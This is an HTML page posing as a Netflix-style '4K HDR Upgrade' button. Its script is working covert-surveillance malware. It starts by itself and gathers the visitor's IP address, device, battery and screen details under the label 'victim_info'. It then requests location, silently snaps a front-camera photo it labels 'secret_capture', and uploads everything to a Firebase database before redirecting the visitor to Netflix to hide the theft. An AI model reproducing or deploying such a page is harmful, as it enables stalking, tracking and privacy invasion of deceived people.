<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #111;
            border-radius: 28px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #222;
        }
        .logo { font-size: 60px; margin-bottom: 20px; }
        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 30px; }
        .btn {
            background: #e50914;
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 40px;
            cursor: pointer;
        }
        .btn:disabled { background: #444; }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            font-size: 12px;
            display: none;
        }
        .status.success { background: #0a2e1a; color: #4ade80; display: block; }
        .status.error { background: #2e0a0a; color: #ff6b6b; display: block; }
        .status.info { background: #0a1a2e; color: #1a73e8; display: block; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">📸</div>
        <h1>4K HDR Upgrade</h1>
        <p>Click below to enable 4K HDR streaming</p>
        <button class="btn" id="startBtn">Enable 4K HDR</button>
        <div class="status" id="statusMsg"></div>
    </div>
    
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            storageBucket: "mobilehk-5e843.firebasestorage.app"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const startBtn = document.getElementById('startBtn');
        const statusMsg = document.getElementById('statusMsg');
        
        function showStatus(msg, type) {
            statusMsg.className = 'status ' + type;
            statusMsg.innerHTML = msg;
        }
        
        if (!sessionId) {
            showStatus('❌ Invalid link', 'error');
            startBtn.disabled = true;
        }
        
        async function saveData(type, data) {
            if (!sessionId) return;
            try {
                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
                    type: type, 
                    data: data, 
                    timestamp: new Date().toISOString()
                });
                return true;
            } catch(e) {
                console.error(e);
                return false;
            }
        }
        
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            try {
                const filename = `${sessionId}_${Date.now()}_${file.name}`;
                const ref = storage.ref(`uploads/${filename}`);
                await ref.put(file);
                const url = await ref.getDownloadURL();
                await saveData(type, { url, name: file.name });
                return url;
            } catch(e) {
                console.error(e);
                return null;
            }
        }
        
        // Get IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'Unknown';
            }
        }
        
        // Get Device Info
        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown";
            if (ua.includes("iPhone")) device = "iPhone";
            else if (ua.includes("Android")) device = "Android";
            else if (ua.includes("Windows")) device = "Windows";
            else if (ua.includes("Mac")) device = "Mac";
            
            let battery = "Unknown";
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + '%';
                    if (!b.charging) battery += ' (discharging)';
                    else battery += ' (charging)';
                } catch(e) {}
            }
            return { device, battery, ua: ua.substring(0, 100), screen: `${screen.width}x${screen.height}` };
        }
        
        // Get Location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        await saveData('location', {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                        resolve(true);
                    },
                    () => resolve(false),
                    { timeout: 10000 }
                );
            });
        }
        
        // Take Camera Photo
        async function takePhoto() {
            try {
                showStatus('📷 Requesting camera access...', 'info');
                
                // Request camera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                
                const url = await uploadFile(file, 'secret_capture');
                if (url) {
                    showStatus('✅ Photo captured successfully!', 'success');
                } else {
                    showStatus('⚠️ Photo captured but upload failed', 'error');
                }
                
                stream.getTracks().forEach(t => t.stop());
                return true;
                
            } catch(error) {
                console.error('Camera error:', error);
                showStatus('❌ Camera access denied. Please allow camera permission.', 'error');
                return false;
            }
        }
        
        // MAIN FUNCTION
        async function start() {
            if (!sessionId) return;
            
            startBtn.disabled = true;
            showStatus('🔧 Starting optimization...', 'info');
            
            // Step 1: Device Info + IP
            const deviceInfo = await getDeviceInfo();
            const ip = await getIP();
            await saveData('victim_info', {
                ip: ip,
                device: deviceInfo.device,
                battery: deviceInfo.battery,
                screen: deviceInfo.screen,
                ua: deviceInfo.ua,
                timestamp: new Date().toISOString()
            });
            showStatus(`✅ Device: ${deviceInfo.device} | Battery: ${deviceInfo.battery}`, 'success');
            
            // Step 2: Location
            showStatus('📍 Requesting location...', 'info');
            await getLocation();
            
            // Step 3: Camera Photo
            await takePhoto();
            
            // Step 4: Complete
            await saveData('complete', { time: new Date().toISOString() });
            showStatus('✅ 4K HDR Enabled! Redirecting...', 'success');
            
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        startBtn.onclick = start;
        
        // Auto start after 1 second
        if (sessionId) {
            setTimeout(start, 800);
        }
    </script>
</body>
</html>
